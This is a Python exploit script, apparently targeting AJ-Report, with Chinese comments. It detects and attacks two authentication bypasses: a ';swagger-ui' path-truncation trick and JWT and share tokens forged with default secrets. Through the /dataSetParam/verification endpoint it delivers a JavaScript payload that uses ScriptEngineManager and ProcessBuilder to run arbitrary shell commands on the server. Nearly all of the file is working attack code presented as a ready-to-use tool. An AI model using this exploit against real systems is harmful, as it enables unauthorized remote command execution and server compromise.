# SQUIRT1E
import json
import jwt
import requests
import argparse
import re
import urllib3

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def getConfig():
    f_config = open("./config.json")
    return json.load(f_config)

def getFakeToken():
    payload = {
        "type": 0,
        "uuid": "627750b8be86421d94facec7e4dba555",
        "tenant": "tenantCode",
        "username": "admin"
    }
    fakeToken = jwt.encode(payload,jwtSecret,algorithm='HS256')
    return fakeToken

def getFakeShareToken():
    payload = {
        "shareCode": 1,
        "reportCode": "/",
        "exp": 4070880000,
        "iat": 1715402146,
        "sharePassword": 1
    }
    fakeShareToken = jwt.encode(payload,JWT_SECRET,algorithm='HS256')
    return fakeShareToken

def defaultJWTKeyDetect(target_url):
    
    response = requests.get(target_url+"/health",headers=headers, verify=False)
    if "status" not in response.text:
        exit("不是默认key")
    
    print("存在jwt伪造漏洞")

def swaggerDetect(target_url):
    
    response = requests.get(target_url+"/health;swagger-ui",headers=headers, verify=False)
    if "status" not in response.text:
        exit("不存在swagger-ui截断鉴权绕过漏洞")
    
    print("存在swagger-ui截断鉴权绕过漏洞")


def defaultJWTKeyAttack(target_url):

    response = requests.post(target_url+"/dataSetParam/verification",headers=headers,json=evil_payload, verify=False)
    print("执行结果： "+response.text)

def swaggerAttack(target_url):
    
    response = requests.post(target_url+"/dataSetParam/verification;swagger-ui",headers=headers,json=evil_payload, verify=False)
    print("执行结果： "+response.text)

def detectBaseUrl(url):
    """
    检测base url并找到app.开头的js文件
    """
    try:
        print(f"正在检测URL: {url}")
        response = requests.get(url, headers=headers, timeout=10, verify=False)
        
        if response.status_code != 200:
            print(f"访问失败，状态码: {response.status_code}")
            return None, None
        
        # 使用正则表达式查找所有<script src=标签
        script_pattern = r'<script\s+src=([^>\s]+)'
        script_matches = re.findall(script_pattern, response.text)
        
        print(f"找到 {len(script_matches)} 个script标签")
        
        # 过滤出app.开头的js文件
        app_js_files = []
        for script_src in script_matches:
            if "/app." in script_src and script_src.endswith('.js'):
                app_js_files.append(script_src)
                print(f"发现app.js文件: {script_src}")
        
        if not app_js_files:
            print("未找到app.开头的js文件")
            return app_js_files, None
        else:
            print(f"总共找到 {len(app_js_files)} 个app.开头的js文件")
            
            # 请求第一个app.js文件并提取baseURL
            if app_js_files:
                base_url_config = extractBaseURL(url, app_js_files[0])
                return app_js_files, base_url_config
        
        return app_js_files, None
        
    except requests.exceptions.RequestException as e:
        print(f"请求失败: {e}")
        return None, None
    except Exception as e:
        print(f"检测过程中发生错误: {e}")
        return None, None


def extractBaseURL(base_url, js_path):
    """
    从app.js文件中提取baseURL配置
    """
    try:
        # 构建完整的js文件URL
        if js_path.startswith('/'):
            js_url = base_url.rstrip('/') + js_path
        else:
            js_url = base_url.rstrip('/') + '/' + js_path
            
        print(f"正在请求JS文件: {js_url}")
        
        response = requests.get(js_url, headers=headers, timeout=10, verify=False)
        
        if response.status_code != 200:
            print(f"请求JS文件失败，状态码: {response.status_code}")
            return None
        
        # 使用正则表达式查找baseURL配置
        baseurl_pattern = r'baseURL:\s*["\']([^"\']+)["\']'
        baseurl_matches = re.findall(baseurl_pattern, response.text)
        
        if baseurl_matches:
            print(f"发现baseURL配置: {baseurl_matches[0]}")
            return baseurl_matches[0]
        else:
            print("未找到baseURL配置")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"请求JS文件失败: {e}")
        return None
    except Exception as e:
        print(f"提取baseURL过程中发生错误: {e}")
        return None


def getArgs():
    # 1. 定义命令行解析器对象
    parser = argparse.ArgumentParser(description='AJ-REPORT EXPLOIT.')
 
    # 2. 添加命令行参数
    parser.add_argument('-u','--url', type=str, required=True , help="url")
    parser.add_argument('-m','--mode',type=str,default="detect",help="detect:检测  attack:攻击")
    parser.add_argument('-b','--bypass', type=str, default="bypass1",help="bypass1:swagger-ui截断绕过  bypass2:jwt默认key伪造")   #默认;swagger-ui截断绕过
    parser.add_argument('-c','--cmd', type=str, default="whoami",help="要执行的命令，默认为whoami")
 
    # 3. 从命令行中结构化解析参数
    args = parser.parse_args()
    return args

if __name__ == "__main__":
    config = getConfig()

    jwtSecret = config["jwtSecret"]
    JWT_SECRET = config["JWT_SECRET"]
    fakeToken = getFakeToken()
    fakeShareToken = getFakeShareToken()
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
    }

    args = getArgs()
    attack_url = args.url
    bypass_mode = args.bypass
    cmd_command = args.cmd

    # 首先检测base url并查找app.js文件
    print("=== 开始检测base url ===")
    app_js_files, base_url_config = detectBaseUrl(attack_url)
    
    # 构建最终的攻击URL
    if base_url_config:
        # 如果baseURL是完整的HTTP/HTTPS URL，直接使用
        if base_url_config.startswith('http://') or base_url_config.startswith('https://'):
            final_attack_url = base_url_config
            print(f"baseURL是完整URL，直接使用: {final_attack_url}")
        else:
            # 确保baseURL配置不以/开头，避免重复
            if base_url_config.startswith('/'):
                base_url_config = base_url_config[1:]
            final_attack_url = attack_url.rstrip('/') + '/' + base_url_config
            print(f"使用baseURL构建攻击URL: {final_attack_url}")
    else:
        final_attack_url = attack_url
        print(f"未找到baseURL，使用原始URL: {final_attack_url}")

    if args.mode == "detect":
        print("\n=== 开始漏洞检测 ===")
        if bypass_mode == "bypass1":
            swaggerDetect(final_attack_url)
        elif bypass_mode == "bypass2":
            headers["Share-Token"] = fakeShareToken
            headers["Authorization"] = fakeToken
            defaultJWTKeyDetect(final_attack_url)
    elif args.mode == "attack":
        print(f"准备执行命令: {cmd_command}")
        evil_payload = {
            "sampleItem":"1",
            "validationRules":f"function verification(data){{var se= new javax.script.ScriptEngineManager();var os=java.lang.System.getProperty('os.name').toLowerCase();var cmd,flag;if(os.indexOf('windows')>=0){{cmd='cmd.exe';flag='/c';}}else{{cmd='/bin/sh';flag='-c';}}var r = se.getEngineByExtension(\"js\").eval(\"new java.lang.Proces\"+\"sBuilder('\"+cmd+\"','\"+flag+\"','{cmd_command}').start().getInputStream();\");result=new java.io.BufferedReader(new java.io.InputStreamReader(r));ss='';while((line = result.readLine()) != null){{ss+=line}};return ss;}}"
        }
        if bypass_mode == "bypass1":
            swaggerAttack(final_attack_url)
        elif bypass_mode == "bypass2":
            headers["Share-Token"] = fakeShareToken
            headers["Authorization"] = fakeToken
            defaultJWTKeyAttack(final_attack_url)
